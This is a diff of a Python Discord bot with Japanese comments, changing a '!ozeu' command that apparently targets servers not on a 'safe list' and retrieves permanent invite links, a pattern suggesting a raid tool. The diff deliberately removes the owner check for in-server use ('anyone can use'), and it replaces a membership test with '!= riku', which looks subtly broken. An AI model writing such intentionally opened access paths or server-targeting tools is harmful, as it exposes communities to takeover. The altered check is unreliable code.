@@ -120,13 +120,12 @@ async def remove_dev(interaction: discord.Interaction, user: discord.User):
 # --- !ozeu コマンド ---
 @bot.command(name="ozeu")
 async def ozeu(ctx, guild_id: str = None):
-    # DM or サーバー共通でOWNER_IDチェック
-    if ctx.author.id not in riku:
-        await ctx.send("❌ このコマンドはBotのオーナーのみ使用できます。")
-        return
-
     if ctx.guild is None:
-        # --- DMで実行された場合 ---
+        # --- DMで実行された場合はオーナーチェック ---
+        if ctx.author.id != riku:
+            await ctx.send("❌ このコマンドはBotのオーナーのみ使用できます。")
+            return
+
         if guild_id is None:
             await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
             return
@@ -138,13 +137,14 @@ async def ozeu(ctx, guild_id: str = None):
             await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
             return
     else:
-        # --- サーバー内で実行された場合 ---
+        # --- サーバー内で実行された場合（誰でも使える） ---
         if ctx.guild.id in safe_servers:
             await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
             return
         guild = ctx.guild
 
-    owners = [await bot.fetch_user(owner_id) for owner_id in OWNER_ID]
+    # この後の共通処理
+    await ctx.send(f"✅ サーバー `{guild.name}` で !ozeu が実行されました。")
 
     # --- 招待リンク取得（無期限・無制限）---
     invite_url = "取得できませんでした"
